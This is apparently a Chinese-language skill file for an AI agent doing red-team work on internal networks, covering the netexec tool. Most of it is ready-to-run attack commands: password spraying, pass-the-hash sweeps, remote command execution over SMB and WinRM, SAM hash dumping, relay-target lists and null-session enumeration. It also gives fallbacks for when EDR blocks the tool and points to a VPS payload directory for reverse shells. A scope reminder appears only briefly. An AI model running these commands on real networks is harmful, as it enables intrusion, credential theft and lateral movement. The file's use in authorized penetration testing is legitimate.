---
name: netexec-scan
description: netexec（crackmapexec 后继）v1.4+ 凭据验证与协议横扫：SMB/LDAP/WinRM/MSSQL/HTTP 一把梭、凭据有效性判定、签名与空会话枚举、域内信任与共享扫描
whenToUse: 内网拿到任何一组凭据后要立刻验证并横扫；或没有凭据要做密码喷洒与空会话枚举时
---

# netexec（凭据验证与协议横扫）

`netexec` = **把"一组凭据 × 一批主机 × 多个协议"压成一条命令**的横扫引擎。
拿到凭据先别急着单点登录——**凭据复用是命中率最高的一招**（同镜像批量装机的内网常是同一个本地管理员口令）。
crackmapexec 已停更，netexec 是它的直接后继，命令族兼容（`cme` 别名仍在）。

## 与 fscan / gogo 的分工

| | netexec | fscan | gogo |
| --- | --- | --- | --- |
| 强项 | **已有凭据的验证与横扫**、协议细节（签名/LDAP 查询/OPSEC） | 无凭据弱口令 + 高危漏洞 | 大网段测绘 + 指纹 |
| 典型输入 | 用户/口令/哈希/Ticket | 网段 | 网段 |
| 一句话 | "这组凭据在哪些机器上是管理员？" | "这批机器哪里有弱口令和 03？" | "内网有多大、每台跑什么？" |

顺序：**gogo 铺面 → fscan 打点 → 拿到凭据后 netexec 横扫验证**。

## 二进制

```
本机 : $DSH_HOME/redteam/toolkit/netexec/netexec        （或 pipx 安装：pipx install netexec）
VPS  : http://<你的VPS_IP>:9100/                          （载荷目录，见 vps-reverse-shell）
```

Windows 目标上没有 netexec 客户端时，等效打法走 `lateral-movement` 的 impacket 单工具族；
netexec 的价值是**批量 + 结果聚合**，单点验证用 impacket 也够。

## 核心用法（真实命令）

```bash
# 0) 无凭据摸底：SMB 签名状态 + 空会话 + 域信息（先探，不打）
netexec smb 10.0.0.0/24 --gen-relay-list runs/relay-targets.txt   # 不支持签名的 = relay 候选
netexec smb 10.0.0.5 -u '' -p '' --shares                          # 空会话摸共享
netexec smb 10.0.0.0/24 -u guest -p '' --local-groups              # 低权限也能读组信息

# 1) 凭据验证：这组口令在整段上是谁的本地管理员
netexec smb 10.0.0.0/24 -u users.txt -p 'P@ssw0rd!' --continue-on-success
#    输出每行 = 主机 | 是否有效 | 是否管理员 | 域 | 机器名 | OS —— 直接照着落库

# 2) 哈希复用（PtH）：拿到 NTLM 哈希后横扫
netexec smb 10.0.0.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' --continue-on-success

# 3) 密码喷洒（单口令 × 多用户；域内先查锁定策略，见失败分支）
netexec smb 10.0.0.0/24 -u domain_users.txt -p 'Winter2026!' --continue-on-success --no-bruteforce

# 4) 协议面逐个过（同一组凭据）
netexec mssql 10.0.0.0/24 -u sa -p 'sa123456' --query "SELECT @@version"
netexec winrm  10.0.0.0/24 -u user -p 'pass' -X 'whoami /priv'      # WinRM 直接拿命令回显
netexec ldap   10.0.0.0/24 -u user -p 'pass' --sam-server-info
netexec http   10.0.0.0/24 -u user -p 'pass' --headers              # 管理端/打印机/Tomcat 弱口令面

# 5) 验证通过后顺手执行（确认权限深度）
netexec smb 10.0.0.5 -u user -p 'pass' -x 'whoami & net localgroup administrators'   # 命令执行
netexec smb 10.0.0.5 -u user -p 'pass' --sam   # 本地 SAM 转储（拿到一堆哈希 → 喂给 lateral-movement）
netexec ldap 10.0.0.5 -u user -p 'pass' --adcs # ADCS 证书服务检查（ESC1 系列提权入口）
```

## 选型表：拿到什么就用哪种模式

| 手上有的 | 用什么 | 命令要点 |
| --- | --- | --- |
| 明文口令 × 多主机 | `-u user -p pass` + 网段 | `--continue-on-success` 别一台中断 |
| NTLM 哈希 | `-H` | 单机验证 + 横扫都行 |
| 只有用户名列表 | `--no-bruteforce` 喷洒 | 一个口令过完全表再换口令（防锁） |
| Kerberos Ticket | `-k` + kinit | 走 88 端口，绕过部分 NTLM 拦截 |
| 想摸 relay 候选 | `--gen-relay-list` | 配合 ntlmrelayx（见 lateral-movement） |

## 失败分支

- **全部无效**：先判是不是被锁/被拦——`netexec smb <ip> -u test -p wrong` 看返回是 `STATUS_LOGON_FAILURE`（凭据错）还是 `STATUS_ACCOUNT_LOCKED_OUT`（锁了，停手等策略窗口）；再换协议试（口令可能只对 MySQL/HTTP 有效，SMB 本地管理员是另一套）。
- **EDR 杀 netexec 行为**（smbexec 落地服务被秒删）：换 `--protocol winrm`（-X 执行，无服务落地）或 `wmiexec` 模式；仍被拦就退回单点 impacket 低频操作。
- **签名强制（SMB 3）**：PtH 仍可（netexec 自动协商），但 relay 不行——把签名主机从 relay 清单剔除。
- **Windows 上没装 netexec**：`pipx install netexec` 需 Python ≥3.9；装不动就用 WSL/Git Bash 侧跑，或改走 `lateral-movement` 的 impacket 族。

## 结果落库（必须做）

- 每台**验证成功**的主机：`redteam_access_add`（`method=cred-reuse`，写清用的哪组凭据、是否本地管理员）。
- 每台**验证失败但有信息**的主机（OS/域/签名状态/共享）：并入 `redteam_asset_add` 的端口 `service`/`banner` 字段。
- 喷出来的新有效凭据：`redteam_credential_add`（`source=credential-reuse|spray`，写清 `tool=netexec`）。
- 关键横扫命令与命中摘要：`redteam_chain_add`（`stage_code=internal`，`tool` 写完整命令含网段与凭据来源）。
- **别只报"扫过了"**：库里要能看到"哪台、哪组凭据、什么权限"三要素。

## 纪律

- 喷洒前**先问域口令锁定策略**（`netexec ldap <dc> -u user -p pass --sam-domain-policy`，默认 0 次=不锁，常见 30-50 次）；超了就毁掉一批账号。
- 生产内网 `--continue-on-success` + 低并发（`-g 50`），不要默认 1000 线程轰整段。
- 只在授权范围网段内跑；范围外主机记下来交指挥确认，不顺手打。



<!-- runnability:start scripts/inject-runnability.mjs 生成，勿手改 -->

## 本机可执行性（自动探测；命令是按 Linux/Kali 写的，照抄会撞空）

本技能命令用到的工具里，本机（PATH 与 toolkit 双探）没有：`impacket`、`netexec`、`crackmapexec`、`gogo`
- `impacket`：本机无、也无已验证替代——先确认它是否必要，必要时找官方 Windows 构建
- `netexec`：本机无、也无已验证替代——先确认它是否必要，必要时找官方 Windows 构建
- `crackmapexec`：本机无、也无已验证替代——先确认它是否必要，必要时找官方 Windows 构建
- `gogo`：本机无、也无已验证替代——先确认它是否必要，必要时找官方 Windows 构建

runnability:end -->

<!-- skill-link-graph:build-skill-graph.mjs 生成，勿手改 -->

## 链路位置（本技能不是孤岛：上游先做、下游交给谁、结果落哪个库）

- **阶段**：5 内网渗透｜**角色**：`internal`
- **上游**（先做完这些再进来）：`fscan-intranet`、`credential-attack`
- **下游**（产出交给谁）：`lateral-movement`、`windows-ad`
- **互补**（同类场景一起用）：`gogo-intranet`、`lateral-movement`
- **落库**（做完必须记进演练台，没落库的发现等于没发生）：`asset` —— 用对应的 `redteam_*` 工具写入，带上原始请求/证据
- **收口必做**（打完不算完，要能证明）：命中判定走 `verification-discipline`（误报排除 + 修复五档判定）；打完之后要**补丁后复测**（补丁/修复后再打一遍，确认真的关掉了，而不是换个入口还能打）也走它；说清对手能不能发现走 `detection-pairing`（检测规则 + 响度）；战果归到哪个战术走 `attack-traceability`（ATT&CK 映射）。**出交付物用 `redteam_report`**（kind=score 出计分战报、kind=targets 出靶标清单），整条链路串起来看用 `redteam_attack_chain` / `redteam_attack_path` —— 这两个只在 `redteam-setup` 的工具表里登记过，做具体攻击时不会想到去翻，所以在这里点名

- **配套工具**（做完这步要落库/查询时用，别只记在上下文里）：`redteam_asset_stats`（收集收口先看断层：C 段数/存活/端口/服务/指纹/溯源条数）、`redteam_asset_get`（深入单个目标：全部端口服务+指纹+采集时间线）、`redteam_asset_graph`（C 段→资产→端口→域名 的拓扑，找横向路径用它而不是肉眼翻列表）、`redteam_asset_timeline`（发现时间线，判断哪些是新冒出来的）

<!-- /skill-link-graph -->
